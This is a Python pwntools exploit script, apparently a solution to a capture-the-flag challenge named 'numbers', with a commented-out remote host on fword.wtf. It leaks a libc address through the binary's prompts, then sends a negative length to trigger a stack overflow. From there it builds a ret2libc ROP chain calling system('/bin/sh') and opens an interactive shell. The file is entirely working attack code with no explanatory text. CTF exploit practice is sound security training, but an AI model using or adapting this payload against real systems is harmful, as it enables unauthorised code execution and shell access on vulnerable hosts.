#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./numbers')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.28-0ubuntu1_amd64'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.28.so')
libc = ELF(libpath + 'libc-2.28.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
p = process([binary.path], env={'LD_LIBRARY_PATH': libpath})
#p = remote('numbers.fword.wtf', 1237)
#'''

p.sendafter('do you have any number in mind ??\n','8')
p.sendafter('are yo sure ??\n',8 * 'A')
_ = p.recv(14).strip()[-6:]
atoi = u64(_ + b'\x00\x00') - 16
log.info('atoi: ' + hex(atoi))
libc.address = atoi - libc.sym.atoi
log.info('baselibc: ' + hex(libc.address))

p.sendafter('try again ?\n','y')
p.sendafter('do you have any number in mind ??\n','-1')

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
log.info('pop_rdi: ' + hex(pop_rdi))

payload  = 0x48 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendafter('sure ??\n',payload)
p.recv(len(payload))
p.interactive()
